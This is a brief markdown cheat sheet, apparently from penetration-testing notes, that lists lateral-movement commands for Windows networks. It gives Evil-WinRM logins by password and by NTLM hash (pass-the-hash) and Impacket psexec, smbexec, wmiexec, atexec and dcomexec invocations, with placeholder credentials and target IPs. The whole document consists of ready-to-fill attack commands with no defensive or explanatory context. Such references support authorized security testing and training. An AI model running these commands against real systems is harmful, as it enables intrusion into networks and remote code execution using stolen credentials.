# Lateral Movement

## Remote Execution

### Evil-WinRM Password Auth
    evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'

### Evil-WinRM Hash Auth
    evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

### Impacket PsExec
    impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket SMBExec
    impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket WMIExec
    impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket ATExec
    impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"

### Impacket DCOMExec
    impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
